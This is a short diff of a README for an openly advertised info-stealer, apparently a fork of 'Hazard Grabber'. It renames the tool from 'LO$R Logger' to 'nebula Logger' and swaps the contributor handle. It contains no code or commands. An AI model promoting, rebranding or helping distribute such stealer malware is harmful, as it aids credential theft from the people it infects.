@@ -1,4 +1,4 @@
-# LO$R Logger v2
+# nebula Logger v2
 ### Powerful Stealer that steals [all this stuff](#features)
 
 
@@ -172,7 +172,7 @@ v2.0.0: 09/04/2023
 ```
 
 ### Contributors
-- LO$R#0001
+- nebula#0689
 
 ### <a id="forkedfrom"></a>🕵️‍♂️ 〢 Forked From:
 - Hazard Grabber
